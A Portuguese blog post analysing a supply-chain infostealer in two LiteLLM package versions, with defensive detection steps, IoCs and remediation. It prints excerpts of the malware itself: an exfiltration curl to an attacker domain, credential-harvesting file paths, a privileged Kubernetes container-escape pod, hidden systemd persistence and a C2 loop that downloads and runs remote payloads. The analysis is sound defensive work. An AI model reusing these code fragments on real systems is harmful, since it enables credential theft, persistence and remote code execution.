---
layout: post
title: "Anatomia de um Infostealer Moderno: Três Camadas, Uma Botnet"
date: 2026-03-25 19:36:09
---

*Análise técnica de infostealer encontrado nas versões 1.82.7 e 1.82.8 do pacote LiteLLM*

---

## Contexto

Eu não costumo publicar as analises que faço, mas gostei desse aqui.

Durante uma investigação de supply chain, scripts maliciosos foram identificados nas versões 1.82.7 e 1.82.8 do pacote Python LiteLLM — uma biblioteca amplamente usada como gateway centralizado para APIs de modelos de linguagem. O que pareceu inicialmente um único script ofuscado revelou uma **cadeia de ataque em três estágios**: infostealer, persistência em Kubernetes e um C2 agent permanente com capacidade de execução remota arbitrária.

Apesar de ser um script simples, não é um script amador, ele tem uma complexidade. Separa responsabilidades, evasão multiestágio e resiliência operacional.

O vetor é especialmente eficaz pelo contexto: LiteLLM é frequentemente deployado com acesso a credenciais de múltiplos provedores de AI (OpenAI, Anthropic, Azure OpenAI, etc.), além de rodar em pipelines automatizados com acesso privilegiado à infraestrutura.

Este artigo tenta trazer a arquitetura completa, com análise das principais linhas de cada estágio.

Links que consultei **após** escrever esse Artigo, mas **antes** de publica-lo:

Pronunciamento da Empresa LiteLLM:  
[https://docs.litellm.ai/blog/security-update-march-2026](https://docs.litellm.ai/blog/security-update-march-2026)

Advisory da Wiz.  
[https://app.wiz.io/boards/threat-center/wiz-adv-2026-037](https://app.wiz.io/boards/threat-center/wiz-adv-2026-037)

Post do Snyk (o mais técnico/com código que achei).  
[https://snyk.io/pt-BR/articles/poisoned-security-scanner-backdooring-litellm/](https://snyk.io/pt-BR/articles/poisoned-security-scanner-backdooring-litellm/)

---

## Arquitetura Geral

```
[pip install litellm==1.82.7 ou 1.82.8]
         │
         ├─► Estágio 1: Dropper
         │     └─ Executa infostealer em memória → cifra AES-256 + RSA-4096 → exfiltra
         │
         ├─► Estágio 2: Infostealer
         │     ├─ Coleta: SSH, AWS, K8s secrets, .env, DBs, cripto, /etc/shadow...
         │     ├─ Escala para nós K8s via pod privilegiado
         │     └─ Instala C2 agent como serviço systemd (local + todos os nós)
         │
         └─► Estágio 3: C2 Agent (persistente)
               └─ A cada 50min: consulta checkmarx.zone/raw → baixa → executa qualquer payload
```

---

## Estágio 1 — Dropper

O ponto de entrada foram duas versões do pacote LiteLLM v1.82.7 e v1.82.8. Ele é o 1o Estágio, vulgo Dropper. Sua única responsabilidade é executar o infostealer, que coleta os dados, sem (muitos) deixar rastros, cifrar o resultado e exfiltrá-lo.

### Execução em memória
```python
payload = base64.b64decode(B64_SCRIPT)
subprocess.run([sys.executable, "-"], input=payload, stdout=f, stderr=subprocess.DEVNULL, check=True)
```

O Dropper faz o parsing do Base64 na variável B64_SCRIPT, o infostealer é decodificado e enviado via stdin para o interpretador Python e **nunca toca o disco.** Toda a saída (credenciais, arquivos, outputs de comandos) é capturada no stdout e salva num diretório temporário que é destruído automaticamente ao final. 

### Envelope criptográfico híbrido
```python
# 1. Gera chave de sessão AES aleatória
subprocess.run(["openssl", "rand", "-out", sk, "32"])

# 2. Cifra os dados com AES-256-CBC + PBKDF2
subprocess.run(["openssl", "enc", "-aes-256-cbc", "-in", collected, "-out", ef,
                "-pass", f"file:{sk}", "-pbkdf2"])

# 3. Cifra a chave AES com RSA-4096 do atacante (padding OAEP)
subprocess.run(["openssl", "pkeyutl", "-encrypt", "-pubin", "-inkey", pk,
                "-in", sk, "-out", ek, "-pkeyopt", "rsa_padding_mode:oaep"])

# 4. Empacota tudo
subprocess.run(["tar", "-czf", "tpcp.tar.gz", "payload.enc", "session.key.enc"])
```

Implementação de criptografia híbrida: AES para os dados (eficiente), RSA para a chave (assimétrico). Sem a chave privada do atacante, os dados capturados são (matematicamente) inacessíveis. A chave pública RSA-4096 está hardcoded no inicio do script.

### Exfiltração disfarçada
```python
subprocess.run([
    "curl", "-s", "-X", "POST", "https://models.litellm.cloud/",
    "-H", "Content-Type: application/octet-stream",
    "-H", "X-Filename: tpcp.tar.gz",
    "--data-binary", f"@{bn}"
])
```

O domínio `litellm.cloud` imita o projeto open source legítimo LiteLLM (proxy de APIs de LLMs). Para uma equipe de segurança vendo esse tráfego em logs, parece um desenvolvedor chamando uma API de AI. **Evasão por contexto**: ambientes que usam LLMs regularmente são especialmente vulneráveis a esse disfarce.

---

## Estágio 2 — Infostealer

Esse é o script embutido em `B64_SCRIPT`. Roda inteiramente em memória, escreve tudo no stdout, e nunca levanta exceções visíveis — cada bloco tem `except: pass` ou `except OSError: pass`.

### Reconhecimento inicial
```python
run('hostname; pwd; whoami; uname -a; ip addr 2>/dev/null || ifconfig 2>/dev/null; ip route 2>/dev/null')
run('printenv')
```

Primeira coisa executada: Fingerprint completo da máquina incluindo **todas as variáveis de ambiente** — onde frequentemente vivem tokens, URLs de banco, API keys e credenciais de serviço.

---

### Fase 1: Chaves SSH e credenciais Git
```python
# Chaves do usuário — todos os tipos conhecidos
for f in ['/.ssh/id_rsa','/.ssh/id_ed25519','/.ssh/id_ecdsa','/.ssh/id_dsa',
          '/.ssh/authorized_keys','/.ssh/known_hosts','/.ssh/config']:
    emit(h+f)
walk([h+'/.ssh'], 2, lambda fp,fn: True)  # qualquer arquivo adicional em .ssh

# Chaves de host do servidor
walk(['/etc/ssh'], 1, lambda fp,fn: fn.startswith('ssh_host') and fn.endswith('_key'))

# Credenciais Git (PATs em plain text)
for f in ['/.git-credentials', '/.gitconfig']: emit(h+f)
```

As chaves de host do servidor (`/etc/ssh/ssh_host_*_key`) permitem impersonar o servidor em ataques AitM (Adversary in the Middle) futuros. O `~/.git-credentials` armazena tokens do GitHub/GitLab em plain text quando o credential helper é `store`.

---

### Fase 2: AWS — quatro vetores simultâneos
```python
# Vetor 1: arquivos locais
emit(h+'/.aws/credentials')
emit(h+'/.aws/config')

# Vetor 2: variáveis de ambiente
run('env | grep AWS_')

# Vetor 3: ECS Task Role (credenciais do container)
run('curl -s http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}')

# Vetor 4: EC2 IMDS (role da instância)
run('curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/')
```

Se encontrou credenciais, tenta IMDS v2 para obter as credenciais do IAM role da instância (frequentemente mais privilegiadas que as do usuário):

```python
# IMDS v2 — com token de sessão, mais discreto que v1
tkn_req = urllib.request.Request('http://169.254.169.254/latest/api/token',
    headers={'X-aws-ec2-metadata-token-ttl-seconds': '21600'}, method='PUT')
imds_token = r.read().decode()
# ... obtém role_name, depois as credenciais temporárias
AK = creds.get('AccessKeyId', AK)   # substitui pelas do role se tiver
SK = creds.get('SecretAccessKey', SK)
ST = creds.get('Token', ST)
```

Com essas credenciais, chama diretamente a API AWS — sem boto3, implementando **SigV4 do zero**:

```python
# Lista e extrai TODOS os secrets do Secrets Manager
sm = aws_req('POST', 'secretsmanager', REG, '/', 'Action=ListSecrets', ...)
for s in sm.get('SecretList', []):
    sv = aws_req('POST', 'secretsmanager', REG, '/', '',
        {'X-Amz-Target': 'secretsmanager.GetSecretValue'}, ...)

# Lista parâmetros do SSM Parameter Store
ssm = aws_req('POST', 'ssm', REG, '/', 'Action=DescribeParameters&Version=2014-11-06', ...)
```

---

### Fase 3: Kubernetes — coleta + escalação de privilégios
```python
# Service account token montado automaticamente em pods
emit('/var/run/secrets/kubernetes.io/serviceaccount/token')
emit('/var/run/secrets/kubernetes.io/serviceaccount/ca.crt')

# Extrai secrets de todos os namespaces
secrets = k8s_get('/api/v1/secrets')
ns_data = k8s_get('/api/v1/namespaces')
for ns_item in ns_data.get('items', []):
    ns = ns_item['metadata']['name']
    k8s_get(f'/api/v1/namespaces/{ns}/secrets')
```

Qualquer pod com service account que tenha permissão de leitura em secrets consegue extrair credenciais de toda a plataforma.

---

### Fase 4: Varredura ampla do filesystem
Tudo em paralelo, via `walk()` recursivo com profundidade configurável:

```python
# Arquivos .env — até 6 níveis de profundidade
walk(all_roots, 6, lambda fp,fn: fn in {'.env','.env.local','.env.production','.env.development','.env.staging'})

# Terraform (infraestrutura como código)
walk(all_roots, 4, lambda fp,fn: fn.endswith('.tfvars'))
walk(all_roots, 4, lambda fp,fn: fn == 'terraform.tfstate')  # estado com IPs, outputs, secrets

# Certificados e chaves TLS
walk(all_roots, 5, lambda fp,fn: os.path.splitext(fn)[1] in {'.pem','.key','.p12','.pfx'})

# Configs de CI/CD
for ci in ['.gitlab-ci.yml', '.travis.yml', 'Jenkinsfile', '.drone.yml']: emit(ci)

# Bancos de dados
emit(h+'/.my.cnf')       # MySQL com senha
emit(h+'/.pgpass')        # PostgreSQL com senha
emit('/etc/redis/redis.conf')
emit('/etc/postfix/sasl_passwd')

# Tokens e credenciais de serviços
emit(h+'/.npmrc')         # token npm (acesso a pacotes privados)
emit(h+'/.vault-token')   # HashiCorp Vault
emit(h+'/.netrc')         # credenciais FTP/HTTP
emit('/etc/shadow')        # hashes de senha do sistema

# Histórico de shell — comandos com credenciais digitadas
for hist in ['/.bash_history','/.zsh_history','/.mysql_history','/.psql_history','/.rediscli_history']:
    emit(h+hist)

# Wallets de cripto
walk([h+'/.ethereum/keystore'], 1, ...)           # Ethereum
walk([h+'/.bitcoin'], 2, lambda fp,fn: fn.startswith('wallet') and fn.endswith('.dat'))
walk([h+'/.config/solana'], 3, ...)               # Solana (validator keypairs inclusos)
walk([h+'/.cardano'], 3, lambda fp,fn: fn.endswith('.skey') or fn.endswith('.vkey'))

# GCP e Azure
walk([h+'/.config/gcloud'], 4, lambda fp,fn: True)
walk([h+'/.azure'], 3, lambda fp,fn: True)
run('cat $GOOGLE_APPLICATION_CREDENTIALS')
```

O `all_roots` cobre `/home/*/`, `/root`, `/opt`, `/srv`, `/var/www`, `/app`, `/data`, `/var/lib`, `/tmp` — praticamente qualquer lugar onde uma aplicação possa estar rodando.

---

### Fase 5: Persistência no cluster Kubernetes
Com o service account token, o script lista todos os nós do cluster e para **cada nó** cria um pod privilegiado em `kube-system`:

```python
pod_manifest = {
    'metadata': {'name': f'node-setup-{node_name[:35]}', 'namespace': 'kube-system'},
    'spec': {
        'nodeName': node_name,
        'hostPID': True,                          # acesso a todos os processos do nó
        'hostNetwork': True,                      # acesso à rede do nó
        'tolerations': [{'operator': 'Exists'}],  # roda em QUALQUER nó, ignora taints
        'containers': [{
            'securityContext': {'privileged': True},
            'volumeMounts': [{'mountPath': '/host'}]  # filesystem completo do nó
        }],
        'volumes': [{'hostPath': {'path': '/'}}],     # monta / do host
    }
}
```

Dentro do pod, com chroot no filesystem do nó:

```bash
echo {PERSIST_B64} | base64 -d > /host/root/.config/sysmon/sysmon.py
chmod 700 /host/root/.config/sysmon/sysmon.py
# instala e habilita como serviço systemd no nó físico
chroot /host systemctl enable --now sysmon.service
```

`hostPID + hostNetwork + privileged + mount de /` = **root no nó físico fora do container**. O `tolerations: Exists` garante que o pod seja agendado em nós com qualquer taint — incluindo masters, nós dedicados, nós com NoSchedule.

---

### Fase 6: Persistência local (fallback)
Se não estiver em ambiente K8s, instala diretamente na máquina:

```python
script_path = '~/.config/sysmon/sysmon.py'
unit_path   = '~/.config/systemd/user/sysmon.service'

if not os.path.exists(script_path):  # não sobrescreve se já existe
    with open(script_path, 'wb') as f:
        f.write(base64.b64decode(PERSIST_B64))
    os.chmod(script_path, 0o700)

    unit = """
[Unit]
Description=System Telemetry Service   ← disfarce
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
ExecStart={py} {script_path}
Restart=always
RestartSec=10               ← reinicia 10s após morrer
KillMode=process            ← não mata processos filho
StandardOutput=null         ← sem logs no journald
StandardError=null          ← sem logs no journald

[Install]
WantedBy=multi-user.target
"""
    subprocess.run(['systemctl', '--user', 'enable', '--now', 'sysmon.service'])
```

Três detalhes do disfarce:
- Nome `sysmon` imita o **Sysmon da Microsoft** — ferramenta legítima de monitoramento
- `Description=System Telemetry Service` — parece telemetria do sistema
- `StandardOutput=null` + `StandardError=null` — **invisível no `journalctl`**

---

## Estágio 3 — C2 Agent

Esse é o `PERSIST_B64` decodado. É o que instala nos nós. Não coleta, não exfiltra. Faz uma coisa: **espera ordens e executa qualquer payload que o atacante publicar**.

```python
C_URL  = "https://checkmarx.zone/raw"  # C2 server — imita a empresa Checkmarx
TARGET = "/tmp/pglog"                   # payload salvo aqui — disfarçado de log PostgreSQL
STATE  = "/tmp/.pg_state"              # memória entre ciclos — URL do último payload executado
```

### Lógica completa

```python
if __name__ == "__main__":
    time.sleep(300)      # dorme 5 minutos — evade sandboxes de análise (costumam rodar <60s)

    while True:
        l = g()          # GET https://checkmarx.zone/raw → espera uma URL como resposta
        prev = ler STATE # URL do último payload executado

        if l and l != prev and "youtube.com" not in l:
            # três condições:
            # 1. recebeu URL válida do C2
            # 2. é diferente da última (atacante publicou algo novo)
            # 3. não é redirect de sinkhole (takedowns redirecionam para youtube.com)
            e(l)

        time.sleep(3000)  # polling a cada 50 minutos — frequência baixa, difícil de detectar
```

```python
def e(l):
    urllib.request.urlretrieve(l, TARGET)   # baixa o binário/script do atacante
    os.chmod(TARGET, 0o755)                  # torna executável
    subprocess.Popen([TARGET],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        start_new_session=True)              # executa DETACHED — sobrevive se o pai morrer
    with open(STATE, "w") as f: f.write(l)  # salva URL para comparação futura
```
O `start_new_session=True` é crítico: mesmo que o `sysmon.service` seja parado, o payload já em execução **continua rodando**. Uma atualização no C2 propaga para todas as máquinas infectadas em até 50 minutos — cluster inteiro, múltiplos nós, máquinas locais.

---

**Nota: aqui começa a tradução (livre) de parte do post da Snyk**

## Detecção: Você Foi Afetado?

O payload executa no momento em que o Python carrega o pacote — **inclusive durante o próprio `pip install`**. Se você instalou 1.82.7 ou 1.82.8, não basta fazer upgrade. O código já pode ter rodado.

### Passo 1: Verificar a versão instalada
```bash
pip show litellm | grep Version
```

Se o output mostrar `1.82.7` ou `1.82.8`, trate o sistema como comprometido e siga os passos abaixo antes de qualquer outra ação.

### Passo 2: Verificar artefatos de persistência
```bash
# Backdoor do sysmon
ls -la ~/.config/sysmon/sysmon.py 2>/dev/null && echo "BACKDOOR FOUND"
ls -la /root/.config/sysmon/sysmon.py 2>/dev/null && echo "ROOT BACKDOOR FOUND"

# Serviço de persistência systemd
systemctl --user status sysmon.service 2>/dev/null
ls -la ~/.config/systemd/user/sysmon.service 2>/dev/null && echo "PERSISTENCE SERVICE FOUND"

# Artefatos do processo de exfiltração
ls /tmp/tpcp.tar.gz /tmp/session.key /tmp/payload.enc /tmp/session.key.enc 2>/dev/null \
  && echo "EXFIL ARTIFACTS FOUND"
```

### Passo 3: Verificar arquivos .pth maliciosos
O mecanismo de entrega na versão 1.82.8 usa um arquivo `.pth` em `site-packages` — que o Python executa automaticamente na inicialização do interpretador, antes de qualquer código da aplicação:

```bash
find $(python3 -c "import site; print(' '.join(site.getsitepackages()))") \
  -name "*.pth" -exec grep -l "base64\|subprocess\|exec" {} \;
```

Qualquer resultado é suspeito. Arquivos `.pth` legítimos contêm apenas caminhos de diretório.

### Passo 4: Verificar hashes dos arquivos
```bash
# proxy_server.py — versão 1.82.7
find / -path "*/litellm/proxy/proxy_server.py" 2>/dev/null -exec shasum -a 256 {} \;
# Hash malicioso: a0d229be8efcb2f9135e2ad55ba275b76ddcfeb55fa4370e0a522a5bdee0120b

# litellm_init.pth — versão 1.82.8
find / -name "litellm_init.pth" 2>/dev/null -exec shasum -a 256 {} \;
# Hash malicioso: 71e35aef03099cd1f2d6446734273025a163597de93912df321ef118bf135238
```

### Passo 5: Verificar indicadores de rede
```bash
grep "litellm.cloud\|checkmarx.zone" /etc/hosts
grep "models.litellm.cloud\|checkmarx.zone" /var/log/syslog 2>/dev/null
```

Presença de `checkmarx.zone` em logs de DNS ou proxy nos últimos 30-90 dias indica que o C2 agent já estava ativo — e a janela de comprometimento começa na data mais antiga encontrada.

### Passo 6: Verificar Kubernetes
```bash
kubectl get pods -A | grep "node-setup-"
```

Pods com esse padrão de nome em `kube-system` são o container escape instalado pelo malware. Cada um representa um nó comprometido.

---

## Remediação

### Se você NÃO instalou 1.82.7 ou 1.82.8
Fixe a versão imediatamente antes que algum processo automatizado instale:

```bash
pip install "litellm<=1.82.6"
```

```
# requirements.txt
litellm<=1.82.6
```

### Se você instalou 1.82.7 ou 1.82.8
Trate o sistema como potencialmente comprometido independente de ter executado código da aplicação. **O payload roda durante o `pip install`.**

**1. Eliminar persistência**

```bash
# Remover backdoor e serviço
rm -f ~/.config/sysmon/sysmon.py
rm -f ~/.config/systemd/user/sysmon.service
systemctl --user disable sysmon.service 2>/dev/null
systemctl --user daemon-reload

# Limpar artefatos temporários
rm -f /tmp/tpcp.tar.gz /tmp/session.key /tmp/payload.enc \
       /tmp/session.key.enc /tmp/.pg_state /tmp/pglog
```

**2. Rotacionar todas as credenciais do sistema afetado**

A rotação deve ser completa — qualquer credencial acessível na máquina pode ter sido exfiltrada:

- **Chaves SSH**: gerar novas, revogar chaves antigas de `authorized_keys`, GitHub e GitLab
- **Cloud**: AWS access keys e IAM roles, GCP service accounts, Azure service principals
- **API keys**: variáveis em arquivos `.env`, variáveis de ambiente, segredos de CI/CD
- **Docker**: credenciais em `~/.docker/config.json`
- **Kubernetes**: `~/.kube/config`, service account tokens in-cluster
- **Bancos de dados**: senhas em arquivos de configuração encontrados no sistema
- **Git**: credenciais em `~/.gitconfig` ou no credential store do sistema
- **Wallets de cripto**: seed phrases e keypairs

**3. Auditar AWS Secrets Manager e SSM Parameter Store**

O malware chama essas APIs diretamente se encontrar credenciais AWS com acesso ao IMDS. Verificar no CloudTrail chamadas `ListSecrets`, `GetSecretValue` e `DescribeParameters` originadas da instância afetada.

**4. Auditar secrets do cluster Kubernetes**

Se um service account token estava presente no ambiente, **todos os secrets de todos os namespaces podem ter sido lidos**. Rotacionar os secrets do cluster e verificar `kubectl get pods -n kube-system | grep node-setup-` em todos os nós.

**5. Reinstalar em ambiente limpo**

Não fazer upgrade in-place — instalar em um ambiente reconstruído do zero:

```bash
pip install "litellm<=1.82.6"
```

---

## Por Que o pip hash verification Não Detectou

Verificação de hash confirma que um arquivo corresponde ao que o PyPI anunciou — **não indica se o conteúdo anunciado é malicioso**.

O arquivo `litellm_init.pth` na versão 1.82.8 está corretamente declarado no `RECORD` do wheel com hash correspondente. `pip install --require-hashes` teria passado sem alertas. O pacote passa em todas as verificações padrão de integridade porque **o conteúdo malicioso foi publicado com credenciais legítimas do maintainer** — não há hash mismatch, não há domínio suspeito no manifesto, não há nome de pacote com typo.

O único caminho de detecção em tempo de instalação seria inspecionar se o pacote instala arquivos `.pth` e se esses arquivos contêm padrões como `subprocess`, `base64` ou `exec`. Nenhum plugin do pip amplamente deployado faz isso automaticamente.

---

## O Padrão Mais Amplo

A seleção de alvos nessa campanha não é aleatória. Cada ferramenta comprometida — um scanner de containers (Trivy), uma ferramenta de infraestrutura (KICS) e uma biblioteca de roteamento de LLMs (LiteLLM) — **requer por design acesso amplo de leitura aos sistemas em que opera**: credenciais, configs, variáveis de ambiente.

LiteLLM em particular é cada vez mais deployado como gateway centralizado de LLMs, armazenando credenciais de múltiplos provedores. Nessa configuração, o conjunto de credenciais acessíveis a partir de um único host comprometido é significativamente maior do que em uma aplicação típica.

A divulgação inicial se propagou por comunidades de desenvolvedores de AI (r/LocalLLaMA, r/Python, Hacker News) em vez dos canais tradicionais de segurança como r/netsec ou feeds de CVE — indicando que o modelo de ameaça específico para tooling de LLM ainda não está integrado às práticas padrão de segurança dessas comunidades.

Um caso de comparação útil é o **Ultralytics AI Pwn Request** de 2024: outra biblioteca Python de AI amplamente usada, comprometida via exploit de CI/CD, com cadeia de ataque similar. O padrão sugere que ferramentas de AI estão se tornando alvos prioritários exatamente pela combinação de adoção rápida, menor maturidade em práticas de segurança e acesso privilegiado à infraestrutura.

---

## Mapeamento MITRE ATT&CK

| Técnica | ID | Implementação |
|---|---|---|
| Supply Chain Compromise | T1195.002 | Pacote PyPI com credenciais legítimas comprometidas |
| Obfuscated Files or Information | T1027 | Triplo base64, execução via stdin |
| Command and Scripting Interpreter | T1059.006 | Python em todas as camadas |
| Unsecured Credentials | T1552 | .env, .aws, .ssh, histórico de shell |
| Cloud Instance Metadata API | T1552.005 | IMDS v1 e v2, ECS task credentials |
| Steal Application Access Token | T1528 | K8s service account tokens |
| Container Escape | T1611 | Pod privilegiado com hostPath mount |
| Systemd Service | T1543.002 | Persistência via ~/.config/systemd |
| Ingress Tool Transfer | T1105 | C2 agent baixa payload via urlretrieve |
| Exfiltration Over C2 Channel | T1041 | AES+RSA → POST HTTPS litellm.cloud |
| Masquerading | T1036 | sysmon.py, pglog, System Telemetry Service |

---

## Indicadores de Comprometimento (IoCs)

### Hashes de arquivo

| Arquivo | SHA-256 |
|---|---|
| `litellm_init.pth` (1.82.8) | `71e35aef03099cd1f2d6446734273025a163597de93912df321ef118bf135238` |
| `proxy_server.py` (1.82.7) | `a0d229be8efcb2f9135e2ad55ba275b76ddcfeb55fa4370e0a522a5bdee0120b` |
| `sysmon.py` | `6cf223aea68b0e8031ff68251e30b6017a0513fe152e235c26f248ba1e15c92a` |

### Rede

| Indicador | Uso |
|---|---|
| `https://models.litellm.cloud/` | Exfiltração — POST com dados cifrados |
| `https://checkmarx.zone/raw` | C2 polling — GET a cada 50 minutos |

### Filesystem

| Caminho | Descrição |
|---|---|
| `~/.config/sysmon/sysmon.py` | C2 agent |
| `/root/.config/sysmon/sysmon.py` | C2 agent (root) |
| `~/.config/systemd/user/sysmon.service` | Serviço de persistência |
| `/tmp/tpcp.tar.gz` | Arquivo de exfiltração |
| `/tmp/session.key`, `/tmp/payload.enc`, `/tmp/session.key.enc` | Artefatos de cifragem |
| `/tmp/.pg_state`, `/tmp/pglog` | Estado do C2 agent |

### Kubernetes

| Indicador | Descrição |
|---|---|
| Pod `node-setup-{node_name}` em `kube-system` | Container escape instalado |
| Container `setup`, imagem `alpine:latest` | Identidade do pod malicioso |

### Chave pública RSA (hardcoded nos três payloads)

```
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvahaZDo8mucujrT15ry+...
```

---

## O Que Fazer Agora

1. Verificar a versão instalada: `pip show litellm | grep Version`
2. Fixar em `<=1.82.6` em todos os ambientes imediatamente
3. Rodar `snyk test --package-manager=pip`
4. Se tinha 1.82.7 ou 1.82.8: rotacionar credenciais e verificar artefatos de persistência
5. Auditar pipelines de CI/CD por versões não fixadas de ferramentas — incluindo GitHub Actions
6. Verificar cluster Kubernetes: `kubectl get pods -A | grep node-setup-`
7. Buscar nos logs de rede conexões históricas para `checkmarx.zone` e `litellm.cloud`

---

**Nota: aqui termina a tradução (livre) de parte do post da Snyk**

---

## Conclusão (ou 'Pensamentos em Voz Alta do Semi-alfabetizado que vos escreve')

O que esse malware demonstra, tecnicamente:

- **Execução em memória** elimina artefatos em disco no estágio inicial
- **Criptografia híbrida correta** torna os dados exfiltrados inacessíveis sem a chave privada
- **Separação de responsabilidades** em camadas complica a análise e permite atualização independente de cada componente
- **Container escape** via pod privilegiado é um vetor real em clusters K8s com RBAC permissivo
- **C2 over HTTPS com domínio plausível e polling lento** passa por controles de rede básicos
- **Nomenclatura disfarçada** (`sysmon`, `System Telemetry Service`, `pglog`) atrasa a detecção humana

### Como o atacante opera

```
Atacante atualiza checkmarx.zone/raw com nova URL → aponta para binário malicioso
         ↓
Em até 50 minutos, TODAS as instâncias infectadas:
    GET checkmarx.zone/raw → nova URL
    Baixa binário em /tmp/pglog
    chmod 755 → executa detached
    Registra URL em /tmp/.pg_state
```

É uma **botnet funcional**. Uma atualização no C2 propaga para todas as máquinas infectadas — cluster inteiro, múltiplos nós, máquinas locais — em até 50 minutos.

---

## Indicadores de Comprometimento (IoCs)

| Indicador | Tipo | Onde verificar |
|---|---|---|
| `checkmarx.zone` | Domínio C2 | Logs DNS, firewall, proxy |
| `litellm.cloud` | Exfiltração | Logs de rede — POST HTTPS |
| `/tmp/pglog` | Arquivo malicioso | Filesystem |
| `/tmp/.pg_state` | Estado do C2 agent | Filesystem |
| `~/.config/sysmon/sysmon.py` | Persistência | Filesystem |
| `~/.config/systemd/user/sysmon.service` | Persistência | `systemctl --user list-units` |
| `Description=System Telemetry Service` | Disfarce | `systemctl --user status sysmon` |
| Pod `node-setup-*` em `kube-system` | K8s | `kubectl get pods -n kube-system` |
| Conexões para `169.254.169.254` | IMDS scraping | Logs do cloud provider |

---

## Resposta a Incidente

Se qualquer máquina executou esse script, assuma comprometimento total. A ordem importa:

**1. Isolamento imediato**  
Tirar da rede antes de qualquer outra ação — o C2 agent pode receber um novo payload a qualquer momento.

**2. Revogar credenciais**  
AWS IAM keys, service account tokens K8s, SSH keys, tokens Git, credenciais de banco. Tudo que estava no ambiente.

**3. Eliminar persistência K8s**
```bash
kubectl get pods -n kube-system | grep node-setup
kubectl delete pod -n kube-system -l <seletor>
```

**4. Eliminar persistência local**
```bash
systemctl --user stop sysmon.service
systemctl --user disable sysmon.service
rm -f ~/.config/sysmon/sysmon.py
rm -f ~/.config/systemd/user/sysmon.service
rm -f /tmp/pglog /tmp/.pg_state
```

**5. Verificar propagação**  
O agent foi instalado em **cada nó do cluster**. Verificar todos os nós individualmente — não só o pod onde o script rodou.

**6. Analisar logs de rede retroativamente**  
Conexões para `checkmarx.zone` e `litellm.cloud` nos últimos 30-90 dias indicam janela de comprometimento. Volume de dados enviados para `litellm.cloud` indica o que foi exfiltrado.

**7. Reconstruir**  
Nós K8s comprometidos não são confiáveis após container escape. A única garantia é recriar as instâncias a partir de imagens conhecidamente limpas.

---
  
Shouts para:  
- pro mano [Vdgonc](https://github.com/Vdgonc) pelas conversas.  
- pro mano [Manoelito Filho](https://www.linkedin.com/in/manoelitofilho/) pelo apontamento no Texto ;).
